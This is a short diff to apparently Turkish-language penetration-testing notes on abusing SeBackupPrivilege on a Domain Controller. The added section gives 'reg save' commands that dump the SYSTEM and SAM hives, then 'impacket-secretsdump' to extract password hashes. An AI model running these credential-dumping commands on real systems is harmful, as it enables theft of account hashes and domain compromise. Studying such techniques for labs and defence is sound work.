@@ -3,6 +3,15 @@
 
 Senaryo: `SeBackupPrivilege`'a sahip (ama local admin olmayan) bir kullanıcı olarak shell aldın (örn. Evil-WinRM ile). Amaç: bu privilege'ı kullanarak Domain Controller'daki `NTDS.dit` + `SYSTEM` hive'ını exfiltrate edip domain hash'lerini çıkarmak.
 
+## Direkt SAM ve SYSTEM çek
+
+```sh
+reg save hklm\system C:\windows\tasks\system
+reg save hklm\sam C:\windows\tasks\sam
+
+# Then crack
+impacket-secretsdump -system system -sam sam local
+```
 ## 1. Privilege doğrulama ve enable
 
 ```powershell
